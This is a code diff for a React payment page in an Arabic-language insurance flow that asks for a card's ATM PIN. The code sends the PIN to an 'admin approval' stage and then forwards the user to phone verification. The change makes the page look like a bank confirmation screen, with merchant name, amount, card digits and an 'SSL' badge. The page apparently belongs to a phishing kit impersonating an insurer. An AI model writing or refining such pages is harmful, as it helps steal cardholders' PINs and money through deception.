@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
 import { Button } from "@/components/ui/button";
-import { CreditCard, Shield, Lock, Loader2 } from "lucide-react";
+import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
 import InsuranceStepper from "@/components/InsuranceStepper";
 import { createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
@@ -15,28 +15,21 @@ const ATMPayment = () => {
   const a = t.atm;
   const offer = location.state?.offer;
   const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
+  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
+  const totalPrice = offer?.totalPrice || offer?.price || 0;
+  const companyName = offer?.company || "بي كير";
 
-  const [pin, setPin] = useState(["", "", "", ""]);
+  const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const inputRef = useRef<HTMLInputElement>(null);
 
-  useEffect(() => { inputRefs.current[0]?.focus(); }, []);
-
-  const handleChange = (i: number, v: string) => {
-    if (!/^\d*$/.test(v)) return;
-    const n = [...pin]; n[i] = v.slice(-1); setPin(n);
-    if (v && i < 3) inputRefs.current[i + 1]?.focus();
-  };
-
-  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !pin[i] && i > 0) inputRefs.current[i - 1]?.focus();
-  };
+  useEffect(() => { inputRef.current?.focus(); }, []);
 
   const handleVerify = () => {
-    if (pin.join("").length !== 4) return;
+    if (pin.length < 4) return;
     setLoading(true);
     const doSubmit = async () => {
-      await createOrUpdateStage(orderId, "payment", { atm_pin: pin.join("") });
+      await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
       linkVisitorToSession({});
       setLoading(false);
       navigate("/insurance/phone-verify", { state: { offer, orderId } });
@@ -60,63 +53,100 @@ const ATMPayment = () => {
         <div className="max-w-5xl mx-auto">
           <InsuranceStepper active={2} />
 
-          <div className="max-w-md mx-auto">
+          <div className="max-w-sm mx-auto">
             <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
-              <div className="bg-card rounded-2xl border border-border shadow-sm p-5 md:p-6 text-center">
-                <motion.div
-                  initial={{ scale: 0 }}
-                  animate={{ scale: 1 }}
-                  transition={{ type: "spring", delay: 0.2 }}
-                  className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4"
-                >
-                  <Lock className="w-8 h-8 text-primary" />
-                </motion.div>
-
-                <h2 className="text-lg font-bold text-foreground mb-2">{a.title}</h2>
-                <p className="text-xs text-muted-foreground mb-6">{a.subtitle}</p>
-
-                <div className="flex gap-3 justify-center mb-6" dir="ltr">
-                  {pin.map((digit, i) => (
-                    <motion.input
-                      key={i}
-                      initial={{ opacity: 0, y: 10 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      transition={{ delay: 0.3 + i * 0.05 }}
-                      ref={(el) => { inputRefs.current[i] = el; }}
-                      type="password"
-                      inputMode="numeric"
-                      maxLength={1}
-                      value={digit}
-                      onChange={(e) => handleChange(i, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(i, e)}
-                      className={`w-12 h-12 md:w-14 md:h-14 text-center text-xl md:text-2xl font-bold rounded-xl border-2 transition-all focus:outline-none ${
-                        digit
-                          ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10"
-                          : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"
-                      }`}
-                    />
-                  ))}
+              <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">
+                
+                {/* Header - Bank style */}
+                <div className="bg-primary/5 border-b border-border px-5 py-4">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
+                        <CreditCard className="w-4 h-4 text-primary" />
+                      </div>
+                      <span className="text-xs font-semibold text-foreground">{a.title}</span>
+                    </div>
+                    <div className="flex items-center gap-1.5">
+                      <Lock className="w-3 h-3 text-primary/60" />
+                      <span className="text-[10px] text-muted-foreground">SSL</span>
+                    </div>
+                  </div>
                 </div>
 
-                <Button
-                  onClick={handleVerify}
-                  disabled={loading || pin.join("").length !== 4}
-                  className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2"
-                >
-                  {loading ? (
-                    <>
-                      <Loader2 className="w-4 h-4 animate-spin" />
-                      {a.verifying}
-                    </>
-                  ) : (
-                    <>
-                      <Lock className="w-3.5 h-3.5" />
-                      {a.confirm}
-                    </>
-                  )}
-                </Button>
+                {/* Transaction details */}
+                <div className="px-5 pt-5 pb-4 space-y-3">
+                  {/* Merchant */}
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">التاجر</span>
+                    <span className="font-semibold text-foreground">{companyName}</span>
+                  </div>
+                  
+                  {/* Amount */}
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">المبلغ</span>
+                    <span className="font-bold text-foreground text-sm">{totalPrice.toLocaleString()} ر.س</span>
+                  </div>
 
-                <div className="flex items-center justify-center gap-2 mt-4 pt-3 border-t border-border">
+                  {/* Card */}
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-muted-foreground">البطاقة</span>
+                    <span className="font-mono font-semibold text-foreground tracking-wider" dir="ltr">•••• {cardLastFour}</span>
+                  </div>
+
+                  <div className="border-t border-dashed border-border" />
+                </div>
+
+                {/* PIN input */}
+                <div className="px-5 pb-5">
+                  <label className="block text-xs font-medium text-foreground mb-2">{a.subtitle}</label>
+                  <div className="relative" dir="ltr">
+                    <input
+                      ref={inputRef}
+                      type="password"
+                      inputMode="numeric"
+                      value={pin}
+                      onChange={(e) => {
+                        const v = e.target.value.replace(/\D/g, "");
+                        setPin(v);
+                      }}
+                      placeholder="••••"
+                      className="w-full h-12 text-center text-xl font-bold tracking-[0.5em] rounded-xl border-2 border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20 focus:outline-none transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40"
+                    />
+                  </div>
+
+                  {/* Processing indicator */}
+                  {loading && (
+                    <motion.div
+                      initial={{ opacity: 0 }}
+                      animate={{ opacity: 1 }}
+                      className="flex items-center justify-center gap-2 mt-4"
+                    >
+                      <Loader2 className="w-4 h-4 text-primary animate-spin" />
+                      <span className="text-xs text-muted-foreground">{a.verifying}</span>
+                    </motion.div>
+                  )}
+
+                  <Button
+                    onClick={handleVerify}
+                    disabled={loading || pin.length < 4}
+                    className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2 mt-4"
+                  >
+                    {loading ? (
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                        {a.verifying}
+                      </>
+                    ) : (
+                      <>
+                        <Lock className="w-3.5 h-3.5" />
+                        {a.confirm}
+                      </>
+                    )}
+                  </Button>
+                </div>
+
+                {/* Footer */}
+                <div className="bg-secondary/40 border-t border-border px-5 py-3 flex items-center justify-center gap-2">
                   <Shield className="w-3.5 h-3.5 text-primary/60" />
                   <span className="text-[10px] text-muted-foreground">{a.secureProcess}</span>
                 </div>
